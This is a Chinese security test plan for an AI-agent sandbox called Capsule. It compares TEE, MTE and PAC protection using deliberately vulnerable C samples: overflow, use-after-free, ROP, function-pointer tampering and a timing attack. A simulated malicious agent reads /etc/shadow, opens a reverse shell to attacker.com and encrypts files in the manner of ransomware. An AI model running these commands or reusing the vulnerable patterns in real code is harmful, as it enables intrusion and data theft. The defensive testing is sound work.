# Capsule 安全测试方案

> **验证 TEE 隔离前后安全性对比**

---

## 测试架构

```
┌─────────────────────────────────────────────────────────────────┐
│                      安全测试框架                                │
├─────────────────────────────────────────────────────────────────┤
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐              │
│  │ 内存安全测试 │  │ 控制流测试  │  │ TEE隔离测试 │              │
│  │   (MTE)     │  │   (PAC)     │  │ (iTrustee)  │              │
│  └─────────────┘  └─────────────┘  └─────────────┘              │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐              │
│  │ 数据保护测试 │  │ 权限边界测试 │  │ 攻击模拟测试│              │
│  └─────────────┘  └─────────────┘  └─────────────┘              │
└─────────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│                    测试环境对比                                  │
│  ┌───────────────────────┐  ┌───────────────────────┐          │
│  │   L1 (无TEE隔离)       │  │   L2+ (TEE隔离)       │          │
│  │   - 进程级隔离         │  │   - iTrustee TEE      │          │
│  │   - 无硬件保护         │  │   - 硬件隔离          │          │
│  └───────────────────────┘  └───────────────────────┘          │
└─────────────────────────────────────────────────────────────────┘
```

---

## 测试类别

### 1. 内存安全测试 (MTE)

#### 测试 1.1: 缓冲区溢出攻击

**目标**: 验证 MTE 能检测并阻止缓冲区溢出攻击

**测试代码**:
```c
// test_buffer_overflow.c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char* input) {
    char buffer[16];
    strcpy(buffer, input);  // 无边界检查
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char** argv) {
    // 尝试溢出攻击
    char payload[64];
    memset(payload, 'A', 63);
    payload[63] = '\0';
    
    vulnerable_function(payload);
    return 0;
}
```

**预期结果**:
| 隔离级别 | 预期行为 |
|----------|----------|
| L1 (无MTE) | 程序继续执行，内存被破坏 |
| L1+ (MTE) | SIGSEGV，检测到溢出并终止 |

**验证命令**:
```bash
# L1 测试
./run_test.sh --isolation L1 --test buffer_overflow

# L1+ 测试 (MTE 启用)
./run_test.sh --isolation L1+ --test buffer_overflow --mte sync
```

---

#### 测试 1.2: Use-After-Free 攻击

**目标**: 验证 MTE 能检测释放后使用漏洞

**测试代码**:
```c
// test_uaf.c
#include <stdlib.h>
#include <string.h>

int main() {
    char* ptr = malloc(32);
    strcpy(ptr, "secret data");
    
    free(ptr);  // 释放内存
    
    // 尝试访问已释放的内存
    printf("Data: %s\n", ptr);  // UAF!
    
    return 0;
}
```

**预期结果**:
| 隔离级别 | 预期行为 |
|----------|----------|
| L1 | 访问成功，可能读到垃圾数据或敏感数据 |
| L1+ (MTE) | SIGSEGV，检测到 UAF 并终止 |

---

#### 测试 1.3: 双重释放攻击

**测试代码**:
```c
// test_double_free.c
#include <stdlib.h>

int main() {
    void* ptr = malloc(32);
    free(ptr);
    free(ptr);  // Double free!
    return 0;
}
```

**预期结果**:
| 隔离级别 | 预期行为 |
|----------|----------|
| L1 | 可能导致堆损坏，程序继续 |
| L1+ (MTE) | 检测到双重释放，终止程序 |

---

### 2. 控制流安全测试 (PAC)

#### 测试 2.1: ROP (Return-Oriented Programming) 攻击

**目标**: 验证 PAC 能阻止返回地址篡改

**测试代码**:
```c
// test_rop.c
#include <stdio.h>
#include <string.h>

void secret_function() {
    printf("SECRET ACCESSED!\n");
}

void vulnerable_function(char* input) {
    char buffer[16];
    strcpy(buffer, input);  // 溢出可覆盖返回地址
}

int main() {
    // 构造 ROP payload，尝试跳转到 secret_function
    char payload[32];
    memset(payload, 'A', 16);
    void* target = (void*)secret_function;
    memcpy(payload + 16, &target, sizeof(void*));
    
    vulnerable_function(payload);
    return 0;
}
```

**预期结果**:
| 隔离级别 | 预期行为 |
|----------|----------|
| L1 | 返回地址被篡改，跳转到 secret_function |
| L1+ (PAC) | PAC 验证失败，程序终止 |

---

#### 测试 2.2: 函数指针篡改

**测试代码**:
```c
// test_func_ptr.c
#include <stdio.h>
#include <string.h>

typedef void (*func_ptr)();

void safe_function() {
    printf("Safe function called\n");
}

void malicious_function() {
    printf("MALICIOUS CODE EXECUTED!\n");
}

int main() {
    func_ptr callback = safe_function;
    char buffer[16];
    
    // 尝试通过溢出篡改函数指针
    char payload[32];
    memset(payload, 'B', 16);
    func_ptr malicious = malicious_function;
    memcpy(payload + 16, &malicious, sizeof(func_ptr));
    
    strcpy(buffer, payload);  // 溢出覆盖 callback
    
    callback();  // 调用被篡改的指针
    return 0;
}
```

**预期结果**:
| 隔离级别 | 预期行为 |
|----------|----------|
| L1 | malicious_function 被执行 |
| L1+ (PAC) | PAC 验证失败，程序终止 |

---

### 3. TEE 隔离测试

#### 测试 3.1: 内存隔离验证

**目标**: 验证 REE 无法直接访问 TEE 内存

**测试代码**:
```c
// test_tee_memory.c
#include <stdio.h>
#include <sys/mman.h>

int main() {
    // 尝试通过 /dev/mem 访问 TEE 内存区域
    FILE* mem = fopen("/dev/mem", "r+b");
    if (!mem) {
        printf("PASS: Cannot open /dev/mem\n");
        return 0;
    }
    
    // TEE 安全内存地址范围 (示例)
    unsigned long tee_base = 0x80000000;  // TEE 内存基址
    
    fseek(mem, tee_base, SEEK_SET);
    char buf[16];
    size_t read = fread(buf, 1, 16, mem);
    
    if (read > 0) {
        printf("FAIL: Can read TEE memory!\n");
    } else {
        printf("PASS: Cannot read TEE memory\n");
    }
    
    fclose(mem);
    return 0;
}
```

**预期结果**:
| 隔离级别 | 预期行为 |
|----------|----------|
| L1 | 可能有权限访问 (不安全) |
| L2+ (TEE) | 访问被阻止，或返回错误 |

---

#### 测试 3.2: 密钥提取攻击

**目标**: 验证密钥无法从 TEE 中提取

**测试代码**:
```c
// test_key_extraction.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 模拟密钥存储
char* generate_key_in_tee() {
    // 在 TEE 中生成密钥
    char* key = malloc(32);
    // 实际应调用 TEE API
    memset(key, 0xAA, 32);  // 模拟密钥
    return key;
}

int main() {
    char* key = generate_key_in_tee();
    
    // 尝试从内存中提取密钥
    printf("Key address: %p\n", (void*)key);
    
    // 模拟攻击者尝试读取密钥
    for (int i = 0; i < 32; i++) {
        printf("%02x ", (unsigned char)key[i]);
    }
    printf("\n");
    
    // 在 TEE 中，密钥应该加密存储
    // 攻击者应该只能看到加密后的数据
    
    free(key);
    return 0;
}
```

**预期结果**:
| 隔离级别 | 预期行为 |
|----------|----------|
| L1 | 密钥明文可见 |
| L2+ (TEE) | 密钥加密或不可访问 |

---

#### 测试 3.3: TEE 应用完整性验证

**测试代码**:
```c
// test_tee_integrity.c
#include <stdio.h>

int main() {
    // 尝试修改 TEE 中的可信应用 (TA)
    // TEE 应该防止未授权的修改
    
    // 1. 检查 TA 签名验证
    // 2. 尝试加载未签名的 TA
    // 3. 验证远程证明
    
    printf("Testing TEE integrity...\n");
    
    // 正常 TA 加载应该成功
    // 未签名 TA 加载应该失败
    
    return 0;
}
```

---

### 4. 数据保护测试

#### 测试 4.1: 敏感数据泄露测试

**目标**: 验证敏感数据不会泄露到日志/内存转储

**测试代码**:
```c
// test_data_leak.c
#include <stdio.h>
#include <string.h>

void process_password(const char* password) {
    char local_copy[64];
    strncpy(local_copy, password, 63);
    
    // 处理密码...
    printf("Processing password...\n");
    
    // 检查是否被记录到日志
    // 在 TEE 中，敏感数据应该被保护
}

int main() {
    const char* secret_password = "MySecretPassword123!";
    
    process_password(secret_password);
    
    // 尝试从内存中搜索密码
    FILE* maps = fopen("/proc/self/maps", "r");
    // 扫描内存查找密码字符串
    
    printf("Scanning memory for secrets...\n");
    
    return 0;
}
```

**预期结果**:
| 隔离级别 | 预期行为 |
|----------|----------|
| L1 | 密码可能出现在内存/日志中 |
| L2+ (TEE) | 密码在 TEE 中处理，外部不可见 |

---

#### 测试 4.2: 侧信道攻击测试

**测试代码**:
```c
// test_side_channel.c
#include <stdio.h>
#include <time.h>

int check_password(const char* input, const char* correct) {
    // 不安全的实现：逐字符比较
    for (int i = 0; correct[i] != '\0'; i++) {
        if (input[i] != correct[i]) {
            return 0;  // 时间差异可被利用
        }
    }
    return 1;
}

int main() {
    const char* correct = "SecretPass";
    char guess[20];
    
    // 模拟计时攻击
    clock_t start, end;
    
    for (char c = 'A'; c <= 'Z'; c++) {
        guess[0] = c;
        guess[1] = '\0';
        
        start = clock();
        check_password(guess, correct);
        end = clock();
        
        double time = (double)(end - start) / CLOCKS_PER_SEC;
        printf("Guess '%c': %.6f seconds\n", c, time);
    }
    
    return 0;
}
```

**预期结果**:
| 隔离级别 | 预期行为 |
|----------|----------|
| L1 | 时间差异可被测量，推断密码 |
| L2+ (TEE) | TEE 提供恒定时间操作，防止计时攻击 |

---

### 5. 权限边界测试

#### 测试 5.1: 能力逃逸测试

**目标**: 验证沙箱能力限制无法被绕过

**测试代码**:
```c
// test_capability_escape.c
#include <stdio.h>
#include <sys/stat.h>

int main() {
    // 沙箱只有 file_read 能力
    // 尝试绕过限制执行写操作
    
    // 1. 尝试写入文件
    FILE* f = fopen("/tmp/escape_test", "w");
    if (f) {
        printf("FAIL: Can write file (should be denied)\n");
        fclose(f);
    } else {
        printf("PASS: Write denied\n");
    }
    
    // 2. 尝试执行命令
    int result = system("id");
    if (result == 0) {
        printf("FAIL: Can execute command\n");
    } else {
        printf("PASS: Execute denied\n");
    }
    
    // 3. 尝试网络访问
    // ...
    
    return 0;
}
```

**预期结果**:
| 能力 | L1 | L2+ (TEE) |
|------|-----|-----------|
| file_read | ✅ | ✅ |
| file_write | ❌ 应拒绝 | ❌ 硬件级拒绝 |
| exec | ❌ 应拒绝 | ❌ 硬件级拒绝 |
| network | ❌ 应拒绝 | ❌ 硬件级拒绝 |

---

#### 测试 5.2: 配额绕过测试

**测试代码**:
```c
// test_quota_bypass.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    // 配额: maxMemoryMB = 64MB
    
    // 尝试分配超过配额的内存
    size_t chunk = 16 * 1024 * 1024;  // 16MB
    void* ptrs[10];
    
    for (int i = 0; i < 10; i++) {
        ptrs[i] = malloc(chunk);
        if (ptrs[i]) {
            printf("Allocated %d MB\n", (i + 1) * 16);
        } else {
            printf("Memory allocation failed at %d MB\n", i * 16);
            break;
        }
    }
    
    return 0;
}
```

**预期结果**:
| 隔离级别 | 预期行为 |
|----------|----------|
| L1 | 可能超过配额 |
| L2+ | cgroup/容器限制强制执行 |

---

### 6. 攻击模拟测试

#### 测试 6.1: 恶意 Agent 模拟

**测试代码**:
```typescript
// test_malicious_agent.ts
import { exec_sandbox } from '@openclaw/capsule';

async function maliciousBehavior() {
    // 1. 尝试读取敏感文件
    await exec_sandbox({
        command: 'cat',
        args: ['/etc/shadow'],
        isolationLevel: 'L2+'
    });
    
    // 2. 尝试建立反向 shell
    await exec_sandbox({
        command: 'bash',
        args: ['-c', 'nc -e /bin/bash attacker.com 4444'],
        isolationLevel: 'L2+'
    });
    
    // 3. 尝试加密勒索
    await exec_sandbox({
        command: 'find',
        args: ['/home', '-name', '*.txt', '-exec', 'encrypt', '{}', ';'],
        isolationLevel: 'L2+'
    });
}
```

**预期结果**:
| 攻击类型 | L1 | L2+ (TEE) |
|----------|-----|-----------|
| 读取 /etc/shadow | 可能成功 | 权限拒绝 |
| 反向 shell | 可能成功 | 网络隔离 |
| 勒索加密 | 可能成功 | 文件系统隔离 |

---

#### 测试 6.2: 容器逃逸测试

**测试代码**:
```bash
#!/bin/bash
# test_container_escape.sh

echo "Testing container escape..."

# 尝试访问宿主机资源
echo "1. Testing /proc access..."
ls -la /proc/self/ns/

echo "2. Testing device access..."
ls -la /dev/

echo "3. Testing mount escape..."
cat /proc/mounts | grep -v "cgroup\|proc\|dev"

echo "4. Testing kernel module loading..."
modprobe dummy 2>&1 || echo "Module loading blocked"

echo "5. Testing pivot_root..."
unshare -m pivot_root . . 2>&1 || echo "pivot_root blocked"
```

---

## 测试自动化框架

### 测试运行脚本

```bash
#!/bin/bash
# run_security_tests.sh

TESTS=(
    "buffer_overflow"
    "use_after_free"
    "double_free"
    "rop_attack"
    "func_ptr_tamper"
    "tee_memory"
    "key_extraction"
    "data_leak"
    "side_channel"
    "capability_escape"
    "quota_bypass"
)

ISOLATION_LEVELS=("L1" "L1+" "L2" "L2+")

for level in "${ISOLATION_LEVELS[@]}"; do
    echo "=========================================="
    echo "Testing with isolation level: $level"
    echo "=========================================="
    
    for test in "${TESTS[@]}"; do
        echo "--- Running: $test ---"
        
        case $level in
            L1)
                ./test_$test --isolation L1
                ;;
            L1+)
                ./test_$test --isolation L1+ --mte sync --pac
                ;;
            L2)
                docker run --rm capsule-test ./test_$test
                ;;
            L2+)
                docker run --rm --device=/dev/teelog capsule-test ./test_$test
                ;;
        esac
        
        echo ""
    done
done
```

### 结果对比报告

```python
# generate_report.py
import json

def compare_results(l1_result, l2plus_result):
    """对比 L1 和 L2+ 的安全测试结果"""
    
    comparisons = []
    
    for test in l1_result['tests']:
        l1_outcome = l1_result['tests'][test]['outcome']
        l2plus_outcome = l2plus_result['tests'][test]['outcome']
        
        if l1_outcome == 'vulnerable' and l2plus_outcome == 'protected':
            comparison = 'SECURITY_IMPROVED'
        elif l1_outcome == l2plus_outcome:
            comparison = 'NO_CHANGE'
        else:
            comparison = 'NEEDS_INVESTIGATION'
        
        comparisons.append({
            'test': test,
            'l1': l1_outcome,
            'l2plus': l2plus_outcome,
            'comparison': comparison
        })
    
    return comparisons

def generate_markdown_report(comparisons):
    """生成 Markdown 格式的测试报告"""
    
    report = """# 安全测试报告

## 测试摘要

| 测试 | L1 结果 | L2+ (TEE) 结果 | 安全改进 |
|------|---------|----------------|----------|
"""
    
    for c in comparisons:
        status = "✅" if c['comparison'] == 'SECURITY_IMPROVED' else "⚠️"
        report += f"| {c['test']} | {c['l1']} | {c['l2plus']} | {status} |\n"
    
    return report
```

---

## 测试用例汇总表

| ID | 测试名称 | 类别 | L1 预期 | L2+ 预期 | 验证方式 |
|----|----------|------|---------|----------|----------|
| 1.1 | 缓冲区溢出 | MTE | 漏洞利用成功 | SIGSEGV | 内存检查 |
| 1.2 | Use-After-Free | MTE | 可能成功 | SIGSEGV | 内存检查 |
| 1.3 | 双重释放 | MTE | 堆损坏 | 检测终止 | 内存检查 |
| 2.1 | ROP 攻击 | PAC | 跳转成功 | PAC 验证失败 | 控制流检查 |
| 2.2 | 函数指针篡改 | PAC | 篡改成功 | PAC 验证失败 | 控制流检查 |
| 3.1 | TEE 内存访问 | TEE | 可能访问 | 访问拒绝 | 硬件隔离 |
| 3.2 | 密钥提取 | TEE | 明文可见 | 加密保护 | 内存扫描 |
| 3.3 | TA 完整性 | TEE | 可篡改 | 签名验证 | 完整性检查 |
| 4.1 | 数据泄露 | 数据保护 | 泄露风险 | TEE 保护 | 日志检查 |
| 4.2 | 侧信道攻击 | 数据保护 | 时间差异 | 恒定时间 | 计时分析 |
| 5.1 | 能力逃逸 | 权限边界 | 可能绕过 | 硬件强制 | 权限检查 |
| 5.2 | 配额绕过 | 权限边界 | 可能绕过 | 强制限制 | 资源检查 |
| 6.1 | 恶意 Agent | 攻击模拟 | 部分成功 | 全部阻止 | 行为检查 |
| 6.2 | 容器逃逸 | 攻击模拟 | 风险存在 | 隔离强化 | 系统检查 |

---

## 测试执行计划

### Phase 1: 基础内存安全 (Week 1)
- [ ] 测试 1.1-1.3: MTE 内存安全
- [ ] 测试 2.1-2.2: PAC 控制流安全

### Phase 2: TEE 隔离验证 (Week 2)
- [ ] 测试 3.1-3.3: TEE 内存/密钥/完整性

### Phase 3: 数据与权限 (Week 3)
- [ ] 测试 4.1-4.2: 数据保护
- [ ] 测试 5.1-5.2: 权限边界

### Phase 4: 攻击模拟 (Week 4)
- [ ] 测试 6.1-6.2: 攻击模拟
- [ ] 生成最终报告

---

## 成功指标

| 指标 | 目标 |
|------|------|
| **漏洞检测率** | L2+ 比 L1 提升 ≥80% |
| **攻击阻止率** | L2+ ≥95% |
| **性能开销** | L2+ vs L1 ≤50% |
| **误报率** | ≤5% |

---

*文档版本: 1.0 | 日期: 2026-03-18*